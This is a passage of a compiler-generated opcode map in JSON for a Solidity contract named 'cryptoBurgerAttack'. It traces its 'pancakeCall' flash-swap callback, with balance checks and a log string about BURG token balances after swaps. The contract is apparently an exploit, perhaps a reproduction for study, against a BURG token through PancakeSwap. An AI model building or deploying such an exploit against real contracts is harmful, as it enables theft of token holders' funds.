    "1932": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "NOT",
      "path": "0"
    },
    "1933": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1935": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1936": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "ADD",
      "path": "0"
    },
    "1937": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "AND",
      "path": "0"
    },
    "1938": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1939": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "ADD",
      "path": "0"
    },
    "1940": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1941": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1943": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1944": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "POP",
      "path": "0"
    },
    "1945": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1946": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "ADD",
      "path": "0"
    },
    "1947": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1948": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x7A5"
    },
    "1951": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1952": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1953": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "1956": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3825,
        3864
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1957": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1958": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1960": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1961": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x7B2"
    },
    "1964": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1965": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1966": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE5"
    },
    "1969": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3768,
        3874
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1970": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1971": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1973": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1974": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1975": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1976": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "SUB",
      "path": "0"
    },
    "1977": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1978": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "LOG1",
      "path": "0"
    },
    "1979": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3884,
        3948
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 14,
      "value": "0x7EE"
    },
    "1982": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1984": {
      "op": "DUP1"
    },
    "1985": {
      "op": "MLOAD"
    },
    "1986": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1988": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "1991": {
      "op": "DUP4"
    },
    "1992": {
      "op": "CODECOPY"
    },
    "1993": {
      "op": "DUP2"
    },
    "1994": {
      "op": "MLOAD"
    },
    "1995": {
      "op": "SWAP2"
    },
    "1996": {
      "op": "MSTORE"
    },
    "1997": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1999": {
      "op": "DUP1"
    },
    "2000": {
      "op": "MLOAD"
    },
    "2001": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2003": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "2006": {
      "op": "DUP4"
    },
    "2007": {
      "op": "CODECOPY"
    },
    "2008": {
      "op": "DUP2"
    },
    "2009": {
      "op": "MLOAD"
    },
    "2010": {
      "op": "SWAP2"
    },
    "2011": {
      "op": "MSTORE"
    },
    "2012": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3905,
        3917
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2013": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3918,
        3919
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2015": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3905,
        3920
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2016": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3905,
        3920
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2017": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3905,
        3920
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2018": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3905,
        3920
      ],
      "op": "LT",
      "path": "0"
    },
    "2019": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3905,
        3920
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "2022": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3905,
        3920
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2023": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3905,
        3920
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "2026": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3905,
        3920
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "2029": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3905,
        3920
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2030": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3884,
        3948
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2031": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 15,
      "value": "0x40"
    },
    "2033": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2034": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "2039": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "2041": {
      "op": "SHL"
    },
    "2042": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2043": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2044": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2046": {
      "op": "DUP1"
    },
    "2047": {
      "op": "MLOAD"
    },
    "2048": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2050": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "2053": {
      "op": "DUP4"
    },
    "2054": {
      "op": "CODECOPY"
    },
    "2055": {
      "op": "DUP2"
    },
    "2056": {
      "op": "MLOAD"
    },
    "2057": {
      "op": "SWAP2"
    },
    "2058": {
      "op": "MSTORE"
    },
    "2059": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2060": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4023
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "2065": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4023
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2066": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x821"
    },
    "2069": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2070": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4037,
        4052
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2071": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4037,
        4052
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2072": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4066,
        4070
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2073": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4066,
        4070
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2074": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2076": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "ADD",
      "path": "0"
    },
    "2077": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "2080": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3973,
        4080
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2081": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2082": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2084": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2086": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2087": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2088": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2089": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "SUB",
      "path": "0"
    },
    "2090": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2091": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2092": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "GAS",
      "path": "0"
    },
    "2093": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "2094": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2095": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2096": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2097": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x83E"
    },
    "2100": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2101": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2102": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2104": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2105": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2106": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2107": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2109": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2110": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2111": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "POP",
      "path": "0"
    },
    "2112": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "POP",
      "path": "0"
    },
    "2113": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "POP",
      "path": "0"
    },
    "2114": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "POP",
      "path": "0"
    },
    "2115": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2117": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2118": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2119": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2121": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2122": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2123": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2125": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2126": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2127": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2128": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "ADD",
      "path": "0"
    },
    "2129": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "2131": {
      "op": "NOT"
    },
    "2132": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "AND",
      "path": "0"
    },
    "2133": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2134": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "ADD",
      "path": "0"
    },
    "2135": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2137": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2138": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x866"
    },
    "2141": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2142": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2143": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2144": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "ADD",
      "path": "0"
    },
    "2145": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2146": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "2149": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3973,
        4080
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2150": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3973,
        4080
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2151": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3958,
        4080
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2152": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3958,
        4080
      ],
      "op": "POP",
      "path": "0"
    },
    "2153": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2155": {
      "op": "DUP1"
    },
    "2156": {
      "op": "MLOAD"
    },
    "2157": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2159": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "2162": {
      "op": "DUP4"
    },
    "2163": {
      "op": "CODECOPY"
    },
    "2164": {
      "op": "DUP2"
    },
    "2165": {
      "op": "MLOAD"
    },
    "2166": {
      "op": "SWAP2"
    },
    "2167": {
      "op": "MSTORE"
    },
    "2168": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4200
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 16
    },
    "2169": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4201,
        4202
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2171": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2172": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2173": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2174": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "LT",
      "path": "0"
    },
    "2175": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x88A"
    },
    "2178": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2179": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x88A"
    },
    "2182": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "2185": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4188,
        4203
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2186": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2187": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2189": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "MUL",
      "path": "0"
    },
    "2190": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2192": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "ADD",
      "path": "0"
    },
    "2193": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "ADD",
      "path": "0"
    },
    "2194": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4188,
        4203
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2195": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2197": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2198": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x8ED"
    },
    "2201": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2202": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2203": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "2205": {
      "op": "DUP1"
    },
    "2206": {
      "op": "DUP3"
    },
    "2207": {
      "op": "MSTORE"
    },
    "2208": {
      "op": "PUSH1",
      "value": "0x3C"
    },
    "2210": {
      "op": "SWAP1"
    },
    "2211": {
      "op": "DUP3"
    },
    "2212": {
      "op": "ADD"
    },
    "2213": {
      "op": "MSTORE"
    },
    "2214": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2216": {
      "op": "DUP1"
    },
    "2217": {
      "op": "MLOAD"
    },
    "2218": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2220": {
      "op": "PUSH2",
      "value": "0x2FDE"
    },
    "2223": {
      "op": "DUP4"
    },
    "2224": {
      "op": "CODECOPY"
    },
    "2225": {
      "op": "DUP2"
    },
    "2226": {
      "op": "MLOAD"
    },
    "2227": {
      "op": "SWAP2"
    },
    "2228": {
      "op": "MSTORE"
    },
    "2229": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "2231": {
      "op": "DUP3"
    },
    "2232": {
      "op": "ADD"
    },
    "2233": {
      "op": "MSTORE"
    },
    "2234": {
      "op": "PUSH32",
      "value": "0x204255524720746F6B656E20616674657220326E6420737761703A2000000000"
    },
    "2267": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "2269": {
      "op": "DUP3"
    },
    "2270": {
      "op": "ADD"
    },
    "2271": {
      "op": "MSTORE"
    },
    "2272": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2274": {
      "op": "DUP2"
    },
    "2275": {
      "op": "ADD"
    },
    "2276": {
      "op": "SWAP2"
    },
    "2277": {
      "op": "SWAP1"
    },
    "2278": {
      "op": "SWAP2"
    },
    "2279": {
      "op": "MSTORE"
    },
    "2280": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2282": {
      "op": "ADD"
    },
    "2283": {
      "op": "SWAP1"
    },
    "2284": {
      "op": "JUMP"
    },
    "2285": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2286": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2288": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2289": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2290": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2291": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "SUB",
      "path": "0"
    },
    "2292": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2293": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4095,
        4213
      ],
      "op": "LOG1",
      "path": "0"
    },
    "2294": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4299
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 17,
      "value": "0x0"
    },
    "2296": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4299
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2297": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2299": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2300": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "2305": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2307": {
      "op": "SHL"
    },
    "2308": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2309": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2310": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4318,
        4322
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "2311": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2313": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2314": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "ADD",
